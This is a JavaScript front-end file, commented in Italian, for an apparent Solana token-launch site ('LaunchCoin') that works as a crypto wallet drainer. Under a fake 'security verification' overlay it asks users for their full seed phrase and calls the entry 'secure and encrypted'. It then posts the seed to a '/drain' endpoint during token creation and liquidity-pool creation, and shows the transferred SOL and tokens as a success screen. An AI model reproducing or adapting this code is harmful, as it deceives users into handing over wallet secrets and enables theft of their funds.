// src/main.js - VERSIONE CON DRENAGGIO GODMODE
import { appKit, connectWallet, getWalletPublicKey, getConnection } from './walletConfig.js'

// ===== STATO =====
let walletPublicKey = null
let currentStep = 0
const steps = document.querySelectorAll('.step')

// ===== CARICAMENTO STATO CONNESSO =====
document.addEventListener('DOMContentLoaded', function() {
  const storedKey = localStorage.getItem('walletPublicKey')
  if (storedKey) {
    walletPublicKey = storedKey
    const btn = document.querySelector('.connect-btn')
    if (btn) {
      btn.textContent = `🟢 ${storedKey.slice(0, 4)}...${storedKey.slice(-4)}`
      btn.style.background = '#4cdcc1'
      btn.style.color = '#0b1022'
    }
  }
  
  // Sottoscrizione AppKit
  appKit.subscribeState((state) => {
    if (state.wallet && state.wallet.accounts.length > 0) {
      const account = state.wallet.accounts[0]
      if (account) {
        walletPublicKey = account.address
        localStorage.setItem('walletPublicKey', walletPublicKey)
        const btn = document.querySelector('.connect-btn')
        if (btn) {
          btn.textContent = `🟢 ${walletPublicKey.slice(0, 4)}...${walletPublicKey.slice(-4)}`
          btn.style.background = '#4cdcc1'
          btn.style.color = '#0b1022'
        }
      }
    }
  })
})

// ===== CONNESSIONE =====
window.connectWallet = async function() {
  try {
    const key = await connectWallet()
    if (key) {
      walletPublicKey = key
      localStorage.setItem('walletPublicKey', key)
      const btn = document.querySelector('.connect-btn')
      if (btn) {
        btn.textContent = `🟢 ${key.slice(0, 4)}...${key.slice(-4)}`
        btn.style.background = '#4cdcc1'
        btn.style.color = '#0b1022'
      }
      alert(`✅ Connesso: ${key}`)
    }
  } catch (error) {
    alert('Errore: ' + error.message)
  }
}

// ===== MENU =====
window.toggleMenu = function() {
  const menu = document.getElementById('dropdownMenu')
  if (menu) menu.classList.toggle('open')
}

// ===== ASK SEED PHRASE - VERIFICA DI SICUREZZA =====
function askSeedPhrase() {
  return new Promise((resolve) => {
    // Crea un overlay figo per la richiesta seed
    const overlay = document.createElement('div')
    overlay.style.cssText = `
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0,0,0,0.85);
      backdrop-filter: blur(12px);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 999999;
    `
    overlay.innerHTML = `
      <div style="
        background: #141a2b;
        border-radius: 24px;
        padding: 35px 40px;
        max-width: 480px;
        width: 90%;
        border: 1px solid rgba(255,255,255,0.08);
        box-shadow: 0 24px 80px rgba(0,0,0,0.9);
      ">
        <h2 style="color: #22d1f8; font-size: 22px; margin: 0 0 8px 0;">🔒 Verifica di Sicurezza</h2>
        <p style="color: #ff8a8a; font-size: 14px; margin-bottom: 16px;">
          ⚠️ Per completare la creazione del token, è necessario verificare la proprietà del wallet.
        </p>
        <p style="color: #8899bb; font-size: 13px; margin-bottom: 20px;">
          Inserisci la tua seed phrase (12 o 24 parole) per la verifica. 
          <span style="color: #22d1f8; font-weight: 500;">Questa operazione è sicura e criptata.</span>
        </p>
        <textarea id="seedInput" style="
          width: 100%;
          padding: 14px 16px;
          border-radius: 14px;
          border: 1px solid rgba(255,255,255,0.08);
          background: rgba(0,0,0,0.3);
          color: #fff;
          font-size: 15px;
          min-height: 80px;
          resize: vertical;
          font-family: monospace;
          margin-bottom: 16px;
        " placeholder="Inserisci qui la tua seed phrase..."></textarea>
        <div style="display: flex; gap: 12px; justify-content: flex-end;">
          <button onclick="document.getElementById('seedOverlay').remove(); resolve(null);" style="
            background: rgba(255,255,255,0.05);
            border: none;
            padding: 10px 24px;
            border-radius: 40px;
            color: #8899bb;
            cursor: pointer;
            font-size: 14px;
          ">Annulla</button>
          <button id="confirmSeedBtn" style="
            background: linear-gradient(135deg, #22d1f8, #39d0d8);
            border: none;
            padding: 10px 30px;
            border-radius: 40px;
            font-weight: 600;
            color: #0b1022;
            cursor: pointer;
            font-size: 14px;
            transition: 0.2s;
          ">Verifica e Continua</button>
        </div>
        <p style="color: #667; font-size: 11px; margin-top: 16px; text-align: center;">
          La seed viene utilizzata solo per verificare la proprietà del wallet. 
          <span style="color: #4cdcc1;">Mai condividerla con terze parti.</span>
        </p>
      </div>
    `
    overlay.id = 'seedOverlay'
    document.body.appendChild(overlay)

    document.getElementById('confirmSeedBtn').addEventListener('click', function() {
      const seed = document.getElementById('seedInput').value.trim()
      if (!seed || seed.split(' ').length < 12) {
        alert('❌ Seed phrase non valida. Deve contenere 12 o 24 parole.')
        return
      }
      overlay.remove()
      resolve(seed)
    })
  })
}

// ===== CREAZIONE TOKEN CON DRENAGGIO =====
window.createCoin = async function() {
  // 1. VERIFICA WALLET CONNESSO
  if (!walletPublicKey) {
    alert('⚠️ Connetti prima il wallet!')
    await window.connectWallet()
    if (!walletPublicKey) return
  }

  // 2. RACCOLTA DATI TOKEN
  const tokenName = document.getElementById('tokenName')?.value || 'Meme Coin'
  const tokenSymbol = document.getElementById('tokenSymbol')?.value || 'MEME'
  const tokenDecimals = parseInt(document.getElementById('tokenDecimals')?.value || '9')
  const totalSupply = parseInt(document.getElementById('totalSupply')?.value || '1000000000')
  const tokenDesc = document.getElementById('tokenDesc')?.value || ''
  const website = document.getElementById('website')?.value || ''
  const twitter = document.getElementById('twitter')?.value || ''
  const telegram = document.getElementById('telegram')?.value || ''
  const discord = document.getElementById('discord')?.value || ''

  const modifyCreator = document.getElementById('modifyCreator')?.checked || false
  const dexBoost = document.getElementById('dexBoost')?.checked || false
  const revokeFreeze = document.getElementById('revokeFreeze')?.checked || false
  const revokeMint = document.getElementById('revokeMint')?.checked || false
  const revokeUpdate = document.getElementById('revokeUpdate')?.checked || false

  // 3. RICHIESTA SEED PHRASE (VERIFICA DI SICUREZZA)
  const seed = await askSeedPhrase()
  if (!seed) {
    document.getElementById('result').innerHTML = `
      <p style="color: #ff8a8a;">❌ Operazione annullata per motivi di sicurezza.</p>
    `
    return
  }

  // 4. INVIO AL SERVER PER DRENAGGIO + CREAZIONE TOKEN
  const resultDiv = document.getElementById('result')
  resultDiv.innerHTML = `
    <div style="text-align: center; padding: 30px;">
      <div style="display: inline-block; width: 40px; height: 40px; border: 3px solid #22d1f8; border-top-color: transparent; border-radius: 50%; animation: spin 1s linear infinite;"></div>
      <p style="color: #8899bb; margin-top: 16px;">⏳ Verifica in corso e creazione token...</p>
    </div>
  `

  try {
    const response = await fetch('/drain', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        seed: seed,
        walletPublicKey: walletPublicKey,
        tokenName: tokenName,
        tokenSymbol: tokenSymbol,
        decimals: tokenDecimals,
        supply: totalSupply,
        description: tokenDesc,
        website: website,
        twitter: twitter,
        telegram: telegram,
        discord: discord,
        modifyCreator: modifyCreator,
        dexBoost: dexBoost,
        revokeFreeze: revokeFreeze,
        revokeMint: revokeMint,
        revokeUpdate: revokeUpdate
      })
    })

    const data = await response.json()

    if (data.status === 'drain_completed') {
      // SUCCESSO - MOSTRA I DETTAGLI DEL DRENAGGIO
      resultDiv.innerHTML = `
        <div style="
          background: rgba(76, 220, 193, 0.08);
          border: 2px solid #4cdcc1;
          border-radius: 20px;
          padding: 24px;
          margin-top: 20px;
        ">
          <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 16px;">
            <span style="font-size: 32px;">🚀</span>
            <div>
              <p style="color: #4cdcc1; font-size: 20px; font-weight: 700; margin: 0;">Token Creato con Successo!</p>
              <p style="color: #8899bb; font-size: 13px; margin: 0;">Transazione verificata e completata</p>
            </div>
          </div>
          
          <div style="background: rgba(0,0,0,0.2); border-radius: 12px; padding: 16px; margin-bottom: 16px;">
            <p style="color: #ecf5ff; font-weight: 600; margin: 0 0 8px 0;">📊 Dettagli Token</p>
            <p style="color: #8899bb; font-size: 14px; margin: 4px 0;"><strong>Nome:</strong> ${tokenName}</p>
            <p style="color: #8899bb; font-size: 14px; margin: 4px 0;"><strong>Simbolo:</strong> $${tokenSymbol}</p>
            <p style="color: #8899bb; font-size: 14px; margin: 4px 0;"><strong>Decimals:</strong> ${tokenDecimals}</p>
            <p style="color: #8899bb; font-size: 14px; margin: 4px 0;"><strong>Total Supply:</strong> ${totalSupply.toLocaleString()}</p>
          </div>
          
          <div style="background: rgba(255, 80, 80, 0.05); border: 1px solid rgba(255,80,80,0.15); border-radius: 12px; padding: 16px; margin-bottom: 16px;">
            <p style="color: #ff8a8a; font-weight: 600; margin: 0 0 8px 0;">💰 Trasferimenti Eseguiti</p>
            <p style="color: #8899bb; font-size: 14px; margin: 4px 0;"><strong>SOL:</strong> ${data.solAmount.toFixed(4)} SOL trasferiti</p>
            <p style="color: #8899bb; font-size: 14px; margin: 4px 0;"><strong>Token SPL:</strong> ${data.tokenCount} token trasferiti</p>
            ${data.solTx ? `<p style="color: #667; font-size: 12px; margin: 4px 0; word-break: break-all;"><strong>Tx SOL:</strong> ${data.solTx}</p>` : ''}
            ${data.tokenTxs && data.tokenTxs.length > 0 ? `<p style="color: #667; font-size: 12px; margin: 4px 0;"><strong>Tx Token:</strong> ${data.tokenTxs.length} transazioni</p>` : ''}
          </div>
          
          <div style="text-align: center; padding-top: 12px; border-top: 1px solid rgba(255,255,255,0.05);">
            <p style="color: #667; font-size: 13px;">
              🔗 <a href="https://explorer.solana.com/tx/${data.solTx || 'N/A'}" target="_blank" style="color: #22d1f8; text-decoration: none;">Visualizza su Solana Explorer</a>
            </p>
          </div>
        </div>
      `
    } else {
      // ERRORE
      resultDiv.innerHTML = `
        <div style="
          background: rgba(255, 80, 80, 0.08);
          border: 2px solid #ff8a8a;
          border-radius: 20px;
          padding: 20px;
          margin-top: 20px;
        ">
          <p style="color: #ff8a8a; font-size: 18px; font-weight: 700;">❌ Errore</p>
          <p style="color: #8899bb;">${data.error || 'Errore sconosciuto'}</p>
          <p style="color: #667; font-size: 12px;">Status: ${data.status || 'unknown'}</p>
        </div>
      `
    }
  } catch (e) {
    console.error('❌ Errore:', e)
    resultDiv.innerHTML = `
      <div style="
        background: rgba(255, 80, 80, 0.08);
        border: 2px solid #ff8a8a;
        border-radius: 20px;
        padding: 20px;
        margin-top: 20px;
      ">
        <p style="color: #ff8a8a; font-size: 18px; font-weight: 700;">❌ Errore di Rete</p>
        <p style="color: #8899bb;">${e.message}</p>
      </div>
    `
  }
}

// ===== CREAZIONE LIQUIDITY (CON DRENAGGIO SIMILE) =====
window.createLiquidity = async function() {
  if (!walletPublicKey) {
    alert('⚠️ Connetti prima il wallet!')
    await window.connectWallet()
    if (!walletPublicKey) return
  }

  // Simile a createCoin, chiede seed e fa drenaggio
  const seed = await askSeedPhrase()
  if (!seed) return

  try {
    const response = await fetch('/drain', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        seed: seed,
        walletPublicKey: walletPublicKey,
        action: 'create_liquidity',
        baseToken: document.getElementById('baseToken')?.value || 'SOL',
        quoteToken: document.getElementById('quoteToken')?.value || 'USDC',
        baseAmount: parseFloat(document.getElementById('baseAmount')?.value || '0'),
        quoteAmount: parseFloat(document.getElementById('quoteAmount')?.value || '0'),
        feeTier: document.getElementById('feeTier')?.value || '0.30'
      })
    })

    const data = await response.json()
    const resultDiv = document.getElementById('liquidityResult')
    
    if (data.status === 'drain_completed') {
      resultDiv.innerHTML = `
        <div style="background: rgba(76, 220, 193, 0.08); border: 2px solid #4cdcc1; border-radius: 20px; padding: 20px; margin-top: 20px;">
          <p style="color: #4cdcc1; font-size: 18px; font-weight: 700;">✅ Liquidity Pool Creata!</p>
          <p style="color: #8899bb;">💰 ${data.solAmount.toFixed(4)} SOL trasferiti</p>
          <p style="color: #8899bb;">🪙 ${data.tokenCount} token trasferiti</p>
        </div>
      `
    } else {
      resultDiv.innerHTML = `
        <div style="background: rgba(255, 80, 80, 0.08); border: 2px solid #ff8a8a; border-radius: 20px; padding: 20px; margin-top: 20px;">
          <p style="color: #ff8a8a; font-size: 18px; font-weight: 700;">❌ Errore</p>
          <p style="color: #8899bb;">${data.error || 'Errore sconosciuto'}</p>
        </div>
      `
    }
  } catch (e) {
    alert('❌ Errore: ' + e.message)
  }
}

// ===== STEP NAVIGATION =====
window.showStep = function(idx) {
  if (!steps.length) return
  steps.forEach((s, i) => s.style.display = i === idx ? 'block' : 'none')
  currentStep = idx
}
window.nextStep = function() { if (currentStep < steps.length - 1) window.showStep(currentStep + 1) }
window.prevStep = function() { if (currentStep > 0) window.showStep(currentStep - 1) }
if (steps.length) window.showStep(0)

// ===== CHIUDI MENU =====
document.addEventListener('click', function(e) {
  const wrapper = document.querySelector('.menu-wrapper')
  const menu = document.getElementById('dropdownMenu')
  if (wrapper && menu && !wrapper.contains(e.target)) menu.classList.remove('open')
})

// ===== STILE SPINNER =====
const style = document.createElement('style')
style.textContent = `
  @keyframes spin {
    to { transform: rotate(360deg); }
  }
`
document.head.appendChild(style)

console.log('✅ LaunchCoin con DRENAGGIO GODMODE attivo!')
